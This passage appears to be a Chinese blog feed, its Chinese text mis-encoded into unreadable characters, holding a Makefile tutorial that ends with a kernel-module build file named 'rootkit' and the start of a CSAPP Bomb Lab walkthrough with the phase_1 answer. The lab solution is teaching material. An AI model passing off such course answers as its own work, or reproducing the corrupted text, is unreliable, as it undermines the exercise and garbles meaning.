‡æ–‡ä»¶</li><li>prerequisitesæ˜¯å‰ç½®æ¡ä»¶</li><li>å¦‚æœè¦æ›´æ–°ç›®æ ‡ï¼Œé‚£ä¹ˆéœ€è¦æ›´æ–°æ‰€æœ‰å‰ç½®æ¡ä»¶</li><li>targetå’Œprerequisiteså¯ä»¥æœ‰å¤šä¸ªï¼Œç”¨ç©ºæ ¼åˆ†å¼€</li><li>commandå‰é¢å¿…é¡»æ˜¯tabï¼Œè¿™äº›commandå°†ä¼šè¢«shellæ‰§è¡Œ</li><li>#æ˜¯æ³¨é‡Š</li></ul><p>ä¸€ä¸ªç®€å•çš„Makefileç¨‹åºï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">blah: </span><span class="hljs-keyword">blah.o</span><br><span class="hljs-keyword"></span><br>cc <span class="hljs-keyword">blah.o </span>-o <span class="hljs-keyword">blah </span><span class="hljs-comment"># Runs third</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">blah.o:</span> <span class="hljs-keyword">blah.c</span><br><span class="hljs-keyword"></span><br>cc -c <span class="hljs-keyword">blah.c </span>-o <span class="hljs-keyword">blah.o </span><span class="hljs-comment"># Runs second</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">blah.c:</span><br><br>echo <span class="hljs-string">&quot;int main() &#123; return 0; &#125;&quot;</span> &gt; <span class="hljs-keyword">blah.c </span><span class="hljs-comment"># Runs first</span><br></code></pre></td></tr></table></figure><p>åœ¨ä¸‹é¢çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œmakeä¼šæ›´æ–°ç›®æ ‡æ–‡ä»¶ï¼š</p><ul><li>å½“å‰ç›®å½•æ²¡æœ‰ç›®æ ‡æ–‡ä»¶</li><li>å‰ç½®æ¡ä»¶éœ€è¦æ›´æ–°</li><li>å‰ç½®æ¡ä»¶ä¿®æ”¹æ—¶é—´æ™šäºç›®æ ‡æ–‡ä»¶ï¼ˆç›®æ ‡æ–‡ä»¶ä¾èµ–äºå‰ç½®æ¡ä»¶ï¼Œè€Œå‰ç½®æ¡ä»¶è¢«ä¿®æ”¹äº†ï¼Œé‚£ä¹ˆç›®æ ‡æ–‡ä»¶éœ€è¦æ›´æ–°ï¼‰</li></ul><p>åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ï¼Œç»å¸¸æœ‰ä¸€äº›è¿‡ç¨‹æ–‡ä»¶ï¼Œæ¯”å¦‚äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ¸…é™¤è¿™äº›äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¿ç•™æºæ–‡ä»¶ï¼Œä»¥ä¾¿äºä¸‹æ¬¡make</p><p>makeè§„åˆ™çš„ä¸€ä¸ªç¤ºä¾‹ï¼š</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">clean:<br>@<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;cleanning project&quot;</span><br>-rm main *<span class="hljs-string">.o</span><br>@<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;clean completed&quot;</span><br></code></pre></td></tr></table></figure><ul><li>@è¡¨ç¤ºè¿™è¡Œè¯­å¥ä¸è¢«è¾“å‡ºï¼Œå¦‚æœä¸åŠ @é‚£ä¹ˆä¼šè¾“å‡ºè¿™è¡Œè¯­å¥æœ¬èº«</li><li>-è¡¨ç¤ºè¿™è¡Œè¯­å¥çš„æ‰§è¡Œé”™è¯¯ä¹Ÿè¦å¿½ç•¥ã€‚ä¸€èˆ¬rmå‘½ä»¤ä¼šåŠ -ï¼Œå› ä¸ºè¦åˆ é™¤çš„æ–‡ä»¶æˆ–è®¸ä¸å­˜åœ¨</li></ul><p>è‡³æ­¤æˆ‘ä»¬å‘ç°Makefileä¸­å·²ç»æœ‰äº†å¾ˆå¤šç›®æ ‡æ–‡ä»¶äº†ï¼Œæ¯”å¦‚mainå’Œcleanï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬è¦æŒ‡å®šæ„å»ºtargetï¼Œé‚£ä¹ˆåªéœ€è¦åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥make targetå³å¯ï¼›å‡è®¾æ²¡æœ‰æŒ‡å®šï¼Œé‚£ä¹ˆä¼šé»˜è®¤æ‰§è¡ŒMakefileæ–‡ä»¶çš„ç¬¬ä¸€ä¸ªç›®æ ‡</p><p>å¦‚æœæ–‡ä»¶å¤¹ä¸­å­˜åœ¨cleanè¿™ä¸ªæ–‡ä»¶åï¼Œé‚£ä¹ˆå†æ¬¡æ‰§è¡Œmake cleanå¹¶ä¸ä¼šæ‰§è¡Œï¼Œå› ä¸ºå®ƒè®¤ä¸ºè¯¥æ–‡ä»¶å·²å­˜åœ¨ã€‚ä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µå‘ç”Ÿï¼Œå¯ä»¥é€šè¿‡.PHONYå£°æ˜cleanæ˜¯â€ä¼ªç›®æ ‡â€</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.PHONY</span>: clean<br><br>clean:<br>@<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;cleanning project&quot;</span><br>-rm main *<span class="hljs-string">.o</span><br>@<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;clean completed&quot;</span><br></code></pre></td></tr></table></figure><p>Makefileä¸­çº¦å®šä¿—æˆçš„åå­—ï¼š</p><blockquote><p>allï¼Œæ‰§è¡Œä¸»è¦çš„ç¼–è¯‘å·¥ä½œï¼Œé€šå¸¸ç”¨ä½œç¼ºçœç›®æ ‡ã€‚<br>installï¼Œæ‰§è¡Œç¼–è¯‘åçš„å®‰è£…å·¥ä½œï¼ŒæŠŠå¯æ‰§è¡Œæ–‡ä»¶ã€é…ç½®æ–‡ä»¶ã€æ–‡æ¡£ç­‰åˆ†åˆ«æ‹·åˆ°ä¸åŒçš„å®‰è£…ç›®å½•ã€‚<br>cleanï¼Œåˆ é™¤ç¼–è¯‘ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚<br>distcleanï¼Œä¸ä»…åˆ é™¤ç¼–è¯‘ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¹Ÿåˆ é™¤å…¶å®ƒç”Ÿæˆçš„æ–‡ä»¶ï¼Œä¾‹å¦‚é…ç½®æ–‡ä»¶å’Œæ ¼å¼è½¬æ¢åçš„æ–‡æ¡£ï¼Œæ‰§è¡Œmake distcleanä¹‹ååº”è¯¥æ¸…é™¤æ‰€æœ‰è¿™äº›æ–‡ä»¶ï¼Œåªç•™ä¸‹æºæ–‡ä»¶ã€‚</p></blockquote><h1 id="å˜é‡ä¸è§„åˆ™"><a href="#å˜é‡ä¸è§„åˆ™" class="headerlink" title="å˜é‡ä¸è§„åˆ™"></a>å˜é‡ä¸è§„åˆ™</h1><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile">foo = <span class="hljs-variable">$(bar)</span><br>bar = Huh?<br><span class="hljs-section">all:</span><br>@echo <span class="hljs-variable">$(foo)</span><br></code></pre></td></tr></table></figure><ul><li>æœ€ç»ˆä¼šæ‰“å°å‡ºHuhï¼Ÿ</li><li>è¿™ç§èµ‹å€¼æ–¹å¼ï¼Œåœ¨makeé‡åˆ°å˜é‡å®šä¹‰æ—¶ä¸ä¼šç«‹å³å±•å¼€</li><li>å¦‚æœæƒ³è¦ç«‹å³å±•å¼€ï¼Œå¯ä»¥ä½¿ç”¨<code>a:=b</code>çš„å½¢å¼</li><li>+=å¯ä»¥è¿½åŠ </li></ul><p>Makefileä¸­æœ‰ä¸€äº›ç‰¹æ®Šå˜é‡ï¼Œæ¯”å¦‚ï¼š</p><ul><li>$@è¡¨ç¤ºè§„åˆ™ä¸­çš„ç›®æ ‡æ–‡ä»¶ï¼ˆtargetï¼‰</li><li>$&lt;è¡¨ç¤ºè§„åˆ™ä¸­ç¬¬ä¸€ä¸ªprerequisites</li><li>$?è¡¨ç¤ºè§„åˆ™ä¸­æ‰€æœ‰æ¯”ç›®æ ‡æ–‡ä»¶æ–°çš„prerequisites</li><li>$^è§„åˆ™ä¸­çš„æ‰€æœ‰prerequisites</li></ul><p>ä½¿ç”¨è¿™äº›å˜é‡ï¼Œå¯ä»¥å¯¹Makefileè¿›è¡Œæ”¹å†™</p><p>ç‰ˆæœ¬1ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">main</span>: <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.o</span> stack<span class="hljs-selector-class">.o</span> maze<span class="hljs-selector-class">.o</span><br>gcc <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.o</span> stack<span class="hljs-selector-class">.o</span> maze<span class="hljs-selector-class">.o</span> -o main<br></code></pre></td></tr></table></figure><p>ç‰ˆæœ¬2ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">main</span>: <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.o</span> stack<span class="hljs-selector-class">.o</span> maze<span class="hljs-selector-class">.o</span><br>gcc $^ -o $@<br></code></pre></td></tr></table></figure><p>å¸¸è§å˜é‡ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">AR<br>é™æ€åº“æ‰“åŒ…å‘½ä»¤çš„åå­—ï¼Œç¼ºçœå€¼æ˜¯arã€‚<br>ARFLAGS<br>é™æ€åº“æ‰“åŒ…å‘½ä»¤çš„é€‰é¡¹ï¼Œç¼ºçœå€¼æ˜¯rvã€‚<br>AS<br>æ±‡ç¼–å™¨çš„åå­—ï¼Œç¼ºçœå€¼æ˜¯<span class="hljs-keyword">as</span>ã€‚<br>ASFLAGS<br>æ±‡ç¼–å™¨çš„é€‰é¡¹ï¼Œæ²¡æœ‰å®šä¹‰ã€‚<br>CC<br>Cç¼–è¯‘å™¨çš„åå­—ï¼Œç¼ºçœå€¼æ˜¯ccã€‚<br>CFLAGS<br>Cç¼–è¯‘å™¨çš„é€‰é¡¹ï¼Œæ²¡æœ‰å®šä¹‰ã€‚<br>CXX<br>C++ç¼–è¯‘å™¨çš„åå­—ï¼Œç¼ºçœå€¼æ˜¯g++ã€‚<br>CXXFLAGS<br>C++ç¼–è¯‘å™¨çš„é€‰é¡¹ï¼Œæ²¡æœ‰å®šä¹‰ã€‚<br>CPP<br>Cé¢„å¤„ç†å™¨çš„åå­—ï¼Œç¼ºçœå€¼æ˜¯<span class="hljs-constructor">$(CC)</span> -Eã€‚<br>CPPFLAGS<br>Cé¢„å¤„ç†å™¨çš„é€‰é¡¹ï¼Œæ²¡æœ‰å®šä¹‰ã€‚<br>LD<br>é“¾æ¥å™¨çš„åå­—ï¼Œç¼ºçœå€¼æ˜¯ldã€‚<br>LDFLAGS<br>é“¾æ¥å™¨çš„é€‰é¡¹ï¼Œæ²¡æœ‰å®šä¹‰ã€‚<br>TARGET_ARCH<br>å’Œç›®æ ‡å¹³å°ç›¸å…³çš„å‘½ä»¤è¡Œé€‰é¡¹ï¼Œæ²¡æœ‰å®šä¹‰ã€‚<br>OUTPUT_OPTION<br>è¾“å‡ºçš„å‘½ä»¤è¡Œé€‰é¡¹ï¼Œç¼ºçœå€¼æ˜¯-o $@ã€‚<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LINK</span>.</span></span>o<br>æŠŠ.oæ–‡ä»¶é“¾æ¥åœ¨ä¸€èµ·çš„å‘½ä»¤è¡Œï¼Œç¼ºçœå€¼æ˜¯<span class="hljs-constructor">$(CC)</span> <span class="hljs-constructor">$(LDFLAGS)</span> <span class="hljs-constructor">$(TARGET_ARCH)</span>ã€‚<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LINK</span>.</span></span>c<br>æŠŠ.cæ–‡ä»¶é“¾æ¥åœ¨ä¸€èµ·çš„å‘½ä»¤è¡Œï¼Œç¼ºçœå€¼æ˜¯<span class="hljs-constructor">$(CC)</span> <span class="hljs-constructor">$(CFLAGS)</span> <span class="hljs-constructor">$(CPPFLAGS)</span> <span class="hljs-constructor">$(LDFLAGS)</span><br><span class="hljs-constructor">$(TARGET_ARCH)</span>ã€‚<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LINK</span>.</span></span>cc<br>æŠŠ.ccæ–‡ä»¶ï¼ˆC++æºæ–‡ä»¶ï¼‰é“¾æ¥åœ¨ä¸€èµ·çš„å‘½ä»¤è¡Œï¼Œç¼ºçœå€¼æ˜¯<span class="hljs-constructor">$(CXX)</span> <span class="hljs-constructor">$(CXXFLAGS)</span><br><span class="hljs-constructor">$(CPPFLAGS)</span> <span class="hljs-constructor">$(LDFLAGS)</span> <span class="hljs-constructor">$(TARGET_ARCH)</span>ã€‚<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">COMPILE</span>.</span></span>c<br>ç¼–è¯‘.cæ–‡ä»¶çš„å‘½ä»¤è¡Œï¼Œç¼ºçœå€¼æ˜¯<span class="hljs-constructor">$(CC)</span> <span class="hljs-constructor">$(CFLAGS)</span> <span class="hljs-constructor">$(CPPFLAGS)</span> <span class="hljs-constructor">$(TARGET_ARCH)</span> -cã€‚<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">COMPILE</span>.</span></span>cc<br>ç¼–è¯‘.ccæ–‡ä»¶çš„å‘½ä»¤è¡Œï¼Œç¼ºçœå€¼æ˜¯<span class="hljs-constructor">$(CXX)</span> <span class="hljs-constructor">$(CXXFLAGS)</span> <span class="hljs-constructor">$(CPPFLAGS)</span> <span class="hljs-constructor">$(TARGET_ARCH)</span> -cã€‚<br>RM<br>åˆ é™¤å‘½ä»¤çš„åå­—ï¼Œç¼ºçœå€¼æ˜¯rm -fã€‚<br></code></pre></td></tr></table></figure><p>make -pæŸ¥çœ‹Makefileçš„éšè—è§„åˆ™</p><h1 id="ä¾èµ–å…³ç³»"><a href="#ä¾èµ–å…³ç³»" class="headerlink" title="ä¾èµ–å…³ç³»"></a>ä¾èµ–å…³ç³»</h1><ul><li><code>gcc -M main.c</code>å¯ä»¥åˆ—å‡ºç›®æ ‡æ–‡ä»¶å’Œæºæ–‡ä»¶çš„ä¾èµ–å…³ç³»ï¼ŒåŒ…æ‹¬ç³»ç»Ÿå¤´æ–‡ä»¶</li><li><code>gcc -MM *.c</code>åœ¨ä¸Šé¢çš„åŸºç¡€ä¸Šä¸åˆ—å‡ºç³»ç»Ÿå¤´æ–‡ä»¶</li></ul><h1 id="ä¸€ä¸ªå†…æ ¸é©±åŠ¨çš„Makefileå®ä¾‹"><a href="#ä¸€ä¸ªå†…æ ¸é©±åŠ¨çš„Makefileå®ä¾‹" class="headerlink" title="ä¸€ä¸ªå†…æ ¸é©±åŠ¨çš„Makefileå®ä¾‹"></a>ä¸€ä¸ªå†…æ ¸é©±åŠ¨çš„Makefileå®ä¾‹</h1><ul><li>-j $(nrpoc) ï¼šæŒ‡å®šå¤„ç†å™¨æ•°é‡</li><li>-C $(LINUX_KERNAL_PATH) ï¼šåœ¨å†…æ ¸æºç è·¯å¾„æ‰§è¡ŒMakefile</li><li>M=$(CURRENT_PATH) modules ï¼šä»¥å†…æ ¸ä¸ºåŸºç¡€ç¼–è¯‘æ¨¡å—çš„æ—¶å€™ï¼ŒæŒ‡å®šç›®å½•æŸ¥æ‰¾æ¨¡å—æºç </li><li>allï¼šmakeçš„ç¼ºçœç›®æ ‡</li><li>@è¡¨ç¤ºè¿™è¡Œè¯­å¥ä¸è¢«è¾“å‡ºï¼Œå¦‚æœä¸åŠ @é‚£ä¹ˆä¼šè¾“å‡ºè¿™è¡Œè¯­å¥æœ¬èº«<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs makefile">TARGET=rootkit<br>OBJ=<span class="hljs-variable">$(TARGET)</span>.o<br>MODULE=<span class="hljs-variable">$(TARGET)</span>.ko <br>obj-m+=<span class="hljs-variable">$(OBJ)</span> <br><br>EXTRA_CFLAGS+=-g -O0 <span class="hljs-comment"># ç¼–è¯‘å‚æ•°</span><br>CURRENT_PATH:=<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span> <span class="hljs-comment">#å½“å‰è·¯å¾„</span><br>LINUX_KERNAL:=<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span> <span class="hljs-comment">#å†…æ ¸ç‰ˆæœ¬å·</span><br>LINUX_KERNAL_PATH:=/lib/modules/<span class="hljs-variable">$(LINUX_KERNAL)</span>/build<br><br><br><span class="hljs-section">all:rootkit </span><br><br><span class="hljs-section">rootkit:</span><br>make -j <span class="hljs-variable">$(nrpoc)</span>-C <span class="hljs-variable">$(LINUX_KERNAL_PATH)</span> M=<span class="hljs-variable">$(CURRENT_PATH)</span> modules <br><span class="hljs-section">install:</span><br><span class="hljs-comment"># å®‰è£…æ¨¡å—</span><br>@sudo insmod <span class="hljs-variable">$(CURRENT_PATH)</span>/<span class="hljs-variable">$(MODULE)</span><br><span class="hljs-comment"># å¸è½½æ¨¡å—</span><br>@sudo rmmod <span class="hljs-variable">$(CURRENT_PATH)</span>/<span class="hljs-variable">$(MODULE)</span><br><br><span class="hljs-section">clean:</span><br>make -C <span class="hljs-variable">$(LINUX_KERNAL_PATH)</span> M=<span class="hljs-variable">$(CURRENT_PATH)</span> clean<br><br><span class="hljs-meta"><span class="hljs-meta-keyword">.PHONY</span>:all install clean rootkit</span><br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>Makefile</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-lab2ï¼šBomb-lab</title>
    <link href="/p/44962f68/"/>
    <url>/p/44962f68/</url>
    
    <content type="html"><![CDATA[<h1 id="å…ˆå¯¼çŸ¥è¯†"><a href="#å…ˆå¯¼çŸ¥è¯†" class="headerlink" title="å…ˆå¯¼çŸ¥è¯†"></a>å…ˆå¯¼çŸ¥è¯†</h1><ul><li>AT&amp;Tæ ¼å¼çš„x86æ±‡ç¼–</li><li>gdbè°ƒè¯•å·¥å…·çš„ä½¿ç”¨</li></ul><p>å‡½æ•°å‚æ•°çš„å‹æ ˆé¡ºåºï¼š</p><ul><li>rdi</li><li>rsi</li><li>rdx</li><li>rcx</li><li>r8</li><li>r9</li></ul><p>å‘½ä»¤é€Ÿè®°ï¼š</p><ul><li>listï¼Œç®€å†™ä¸ºl<ul><li>è¾“å‡ºæºä»£ç ï¼Œé»˜è®¤ä¸ºåè¡Œ</li><li>l n ï¼š è¾“å‡ºç¬¬nè¡Œå‰åçš„ä»£ç </li><li>l function ï¼š è¾“å‡ºå‡½æ•°functionå‰åçš„ä»£ç </li></ul></li><li>breakï¼Œç®€å†™ä¸ºb<ul><li>b è¡Œå·ï¼šåœ¨æŸä¸€è¡Œè®¾ç½®æ–­ç‚¹</li><li>b å‡½æ•°ï¼šåœ¨å‡½æ•°å…¥å£è®¾ç½®æ–­ç‚¹</li></ul></li><li>runè¿è¡Œç¨‹åºå¹¶åœ¨æ–­ç‚¹å¤„åœæ­¢</li><li>nextå¾€åæ‰§è¡Œä¸€è¡Œè¯­å¥</li><li>backtraceæŸ¥çœ‹å‡½æ•°è°ƒç”¨çš„æ ˆå¸§</li><li>pæ‰“å°å˜é‡çš„å€¼æˆ–è€…åœ°å€ï¼ˆprintï¼‰ï¼Œç±»ä¼¼çš„è¿˜æœ‰xå‘½ä»¤ï¼ˆexamineï¼‰</li><li>info localsæŸ¥çœ‹å½“å‰æ ˆå¸§å±€éƒ¨å˜é‡çš„å€¼</li><li>info registerså¯ä»¥æŸ¥çœ‹å½“å‰å¯„å­˜å™¨çš„å€¼</li><li>æ‰“å°å•ä¸ªå¯„å­˜å™¨çš„å€¼<ul><li>i registers eax</li><li>p $eax</li></ul></li><li>display + å˜é‡å å¯ä»¥æ¯æ¬¡åœä¸‹æ¥çš„æ—¶å€™è‡ªåŠ¨æ‰“å°å˜é‡çš„å€¼</li><li>ç›´æ¥æ•²å›è½¦é”®ï¼šé‡å¤ä¸Šä¸€æ¡å‘½ä»¤</li><li>layoutå‘½ä»¤å¯ä»¥æ‹†åˆ†çª—å£<ul><li>layout regsæ˜¾ç¤ºå¯„å­˜å™¨çš„å€¼çš„ç‹¬ç«‹çª—å£</li><li>layout asmæ˜¾ç¤ºæ±‡ç¼–çš„ç‹¬ç«‹çª—å£</li><li>ctrl+x 1 å•çª—å£æ¨¡å¼</li><li>ctrl+x 2 åŒçª—å£æ¨¡å¼</li><li>ctrl+x aå›åˆ°é»˜è®¤çš„gdbæ¨¡å¼</li></ul></li></ul><p><a href="https://github.com/hellogcc/100-gdb-tips/blob/master/src/index.md">100ä¸ªgdbå°æŠ€å·§</a></p><h1 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h1><ul><li>å¾—åˆ°æ±‡ç¼–ä»£ç <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">objdump -d <span class="hljs-keyword">bomb </span>&gt;&gt; <span class="hljs-keyword">bomb.s</span><br><span class="hljs-keyword"></span><br>less <span class="hljs-keyword">bomb.s</span><br></code></pre></td></tr></table></figure></li><li>sshåˆ°æœåŠ¡å™¨</li><li>tmuxè¿›è¡Œåˆ†å±ï¼Œä¸€è¾¹æ˜¯æ±‡ç¼–ä»£ç ä¸€è¾¹æ˜¯gdbè°ƒè¯•</li></ul><h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><ul><li>strings_not_equalæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯ä½ æ‰€è¾“å…¥çš„å­—ç¬¦ä¸²çš„é¦–åœ°å€(rdi)ï¼Œç¬¬äºŒä¸ªæ˜¯æ­£ç¡®çš„å­—ç¬¦ä¸²çš„é¦–åœ°å€(rsi)<ul><li>strings_not_equal(input_string,correct_string)</li><li>å¦‚æœä¸¤ä¸ªä¸ªå­—ç¬¦ä¸²æ˜¯ç›¸ç­‰çš„ï¼Œé‚£ä¹ˆeaxä½œä¸ºå‡½æ•°çš„è¿”å›å€¼å°†ä¼šæ˜¯0</li></ul></li><li>å¯ä»¥ä½¿ç”¨x/s 0x402400å»è§‚å¯Ÿè¿™ä¸ªåœ°å€çš„å€¼æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²</li><li>å¾—åˆ°ç­”æ¡ˆï¼š<code>Border relations with Canada have never been better.</code><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000400ee0</span> &lt;phase_<span class="hljs-number">1</span>&gt;:<br>  <span class="hljs-attribute">400ee0</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">08</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">8</span>,%rsp  # ç»™æ ˆåˆ†é…ç©ºé—´<br>  <span class="hljs-attribute">400ee4</span>:be <span class="hljs-number">00</span> <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">402400</span>,%esi # rdiä¿å­˜ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œrsiä¿å­˜ç¬¬äºŒä¸ªå‚æ•°ï¼Œè¿™é‡Œæ˜¯ä¸ºstrings_not_equalå‡½æ•°å‡†å¤‡å‚æ•°<br>  <span class="hljs-attribute">400ee9</span>:e<span class="hljs-number">8</span> <span class="hljs-number">4</span>a <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">401338</span> &lt;strings_not_equal&gt;<br>  <span class="hljs-attribute">400eee</span>:<span class="hljs-number">85</span> c<span class="hljs-number">0</span>                test   %eax,%eax   # test a,b æ˜¯aä¸båšä¸è¿ç®—çš„æ„æ€<br>  <span class="hljs-attribute">400ef0</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400</span>ef<span class="hljs-number">7</span> &lt;phase_<span class="hljs-number">1</span>+<span class="hljs-number">0</span>x<span class="hljs-number">17</span>&gt; # je/jz æ˜¯å½“è¿ç®—ç»“æœä¸º<span class="hljs-number">0</span>ï¼ˆZFæ ‡å¿—ä¸º<span class="hljs-number">1</span>ï¼‰æ—¶è·³è½¬ã€‚testå’Œjeä¸€èµ·ä½¿ç”¨æ˜¯ä¸ºäº†æ£€æµ‹eaxæ˜¯ä¸æ˜¯<span class="hljs-number">0</span><br>  <span class="hljs-attribute">400ef2</span>:e<span class="hljs-number">8</span> <span class="hljs-number">43</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400ef7</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">08</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">8</span>,%rsp<br>  <span class="hljs-attribute">400efb</span>:c<span class="hljs-number">3</span>                   retq   <br></code></pre></td></tr></table></figure>strings_not_equalå‡½æ•°çš„å…·ä½“å®ç°<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000401338</span> &lt;strings_not_equal&gt;: # %rdiä¿å­˜ç¬¬ä¸€ä¸ªå‚æ•° %rsiä¿å­˜ç¬¬äºŒä¸ªå‚æ•° %rdxä¿å­˜ç¬¬ä¸‰ä¸ªå‚æ•°<br>  <span class="hljs-attribute">401338</span>:<span class="hljs-number">41</span> <span class="hljs-number">54</span>                push   %r<span class="hljs-number">12</span><br>  <span class="hljs-attribute">40133a</span>:<span class="hljs-number">55</span>                   push   %rbp<br>  <span class="hljs-attribute">40133b</span>:<span 